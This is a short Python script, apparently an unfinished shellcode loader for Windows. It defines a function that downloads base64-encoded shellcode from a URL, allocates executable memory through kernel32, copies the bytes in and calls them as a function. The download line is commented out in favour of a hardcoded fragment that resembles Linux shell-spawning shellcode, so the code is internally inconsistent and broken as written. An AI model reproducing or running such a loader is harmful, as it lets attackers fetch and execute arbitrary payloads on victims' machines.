from urllib import request
import base64
import ctypes
##try to fix
kernel32 = ctypes.windll.kernel32
def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode
def write_memory(buf):
    length = len(buf)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.c_size_t)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr
def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()
if __name__ == '__main__':
    url = "https://packetstormsecurity.com/mirrors/"
    #shellcode = get_code(url)
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    run(shellcode)